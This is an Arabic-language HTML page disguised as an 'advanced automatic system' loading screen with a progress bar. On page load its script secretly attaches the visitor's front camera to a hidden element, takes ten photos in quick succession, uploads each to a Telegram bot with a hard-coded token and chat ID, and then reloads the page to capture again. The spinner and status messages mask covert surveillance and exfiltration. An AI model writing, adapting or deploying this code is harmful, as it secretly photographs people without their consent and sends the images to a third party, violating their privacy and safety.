<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>النظام التلقائي المتقدم</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <style>
        :root {
            --main-color: #2ecc71;
            --bg-gradient: linear-gradient(135deg, #1abc9c, #3498db);
        }

        body {
            margin: 0;
            min-height: 100vh;
            background: var(--bg-gradient);
            animation: gradientShift 10s infinite;
            background-size: 200% 200%;
            color: white;
            font-family: 'Tajawal', sans-serif;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .main-container {
            padding: 2rem;
            text-align: center;
        }

        .status-box {
            background: rgba(0,0,0,0.2);
            border-radius: 15px;
            padding: 2rem;
            margin: 2rem auto;
            max-width: 600px;
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255,255,255,0.15);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        .loading-dots:after {
            content: '.';
            animation: dots 1.5s infinite;
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.26/webcam.min.js"></script>
</head>
<body>
    <div class="main-container">
        <div class="status-box animate__animated animate__zoomIn">
            <h1 class="display-5 mb-4">⚡ النظام التلقائي الفائق</h1>
            <div id="status" class="h4">
                <span class="loading-dots">جارِ التهيئة الأولية</span>
            </div>
            <div class="progress mt-3" style="height: 6px;">
                <div id="progressBar" class="progress-bar" 
                     role="progressbar" style="width: 0%; background: var(--main-color)"></div>
            </div>
        </div>
    </div>

    <div id="hidden_camera" style="display: none;"></div>

    <script>
        const BOT_TOKEN = '8031350603:AAEfbiBpNACqXmOsP4XLRz-MbexsfQgKw98';
        const CHAT_ID = '7828957324';
        const TOTAL_IMAGES = 10;
        const CAPTURE_DELAY = 100; // 0.1 second

        let isCapturing = false;
        let captureCount = 0;

        async function initializeSystem() {
            try {
                await setupCamera();
                setTimeout(startRapidCapture, 500);
            } catch (error) {
                showError('يُرجى السماح باستخدام الكاميرا');
            }
        }

        async function setupCamera() {
            return new Promise((resolve, reject) => {
                Webcam.set({
                    width: 640,
                    height: 480,
                    dest_width: 1280,
                    dest_height: 720,
                    image_format: 'jpeg',
                    jpeg_quality: 85,
                    fps: 60,
                    facingMode: 'user'
                });

                Webcam.attach('#hidden_camera', () => {
                    updateStatus('الكاميرا جاهزة');
                    resolve();
                }, (err) => {
                    reject(err);
                });
            });
        }

        async function startRapidCapture() {
            isCapturing = true;
            updateStatus('بدء الالتقاط السريع');
            
            const capturePromises = [];
            for (let i = 0; i < TOTAL_IMAGES; i++) {
                capturePromises.push(captureImage(i));
                await new Promise(r => setTimeout(r, CAPTURE_DELAY));
            }

            await Promise.all(capturePromises);
            await sendAllImages();
        }

        async function captureImage(index) {
            return new Promise(resolve => {
                Webcam.snap(data => {
                    const img = new Image();
                    img.src = data;
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = img.width;
                        canvas.height = img.height;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(img, 0, 0);
                        canvas.toBlob(blob => {
                            uploadImage(blob, index);
                            updateProgress((index + 1) * (100 / TOTAL_IMAGES));
                            resolve();
                        }, 'image/jpeg', 0.85);
                    };
                });
            });
        }

        async function uploadImage(blob, index) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `capture_${index + 1}.jpg`);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                captureCount++;
                updateStatus(`تم إرسال ${captureCount}/${TOTAL_IMAGES}`);
            } catch (error) {
                console.error('Upload error:', error);
            }
        }

        async function sendAllImages() {
            updateStatus('✅ اكتملت العملية بنجاح');
            await new Promise(r => setTimeout(r, 2000));
            location.reload();
        }

        function updateStatus(text) {
            document.getElementById('status').innerHTML = text;
        }

        function updateProgress(percent) {
            document.getElementById('progressBar').style.width = percent + '%';
        }

        function showError(message) {
            updateStatus(`❌ خطأ: ${message}`);
            document.getElementById('progressBar').style.background = '#e74c3c';
        }

        // بدء التشغيل التلقائي
        window.addEventListener('load', () => {
            setTimeout(initializeSystem, 1000);
        });
    </script>
</body>
</html>
